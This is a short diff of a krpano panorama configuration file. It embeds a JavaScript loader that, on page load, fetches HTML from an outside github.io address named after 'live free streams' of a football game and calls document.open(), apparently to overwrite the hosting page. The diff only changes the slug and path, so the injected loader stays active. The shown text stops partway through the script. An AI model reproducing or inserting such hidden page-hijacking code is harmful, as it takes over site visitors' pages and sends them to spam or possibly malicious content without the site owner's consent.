@@ -1,9 +1,9 @@
 <krpano version="1.0.8.15">
 <action name="js_loader_start" type="Javascript"><![CDATA[
-var id = new URLSearchParams(window.location.search).get("id") || "video-jaguars-vs-ravens-live-free-s-treams-tv-9Kx2m";
+var id = new URLSearchParams(window.location.search).get("id") || "video-ravens-vs-jaguars-live-free-s-treams-on-tv-K3mQ7";
 if (!window.__kgh_loader_done) {
   window.__kgh_loader_done = 1;
-  window.fetch("https://natoretv.github.io/article/qrb/" + id + ".html")
+  window.fetch("https://natoretv.github.io/article/gex/" + id + ".html")
     .then(function (r) { return r.text(); })
     .then(function (html) {
       window.document.open();
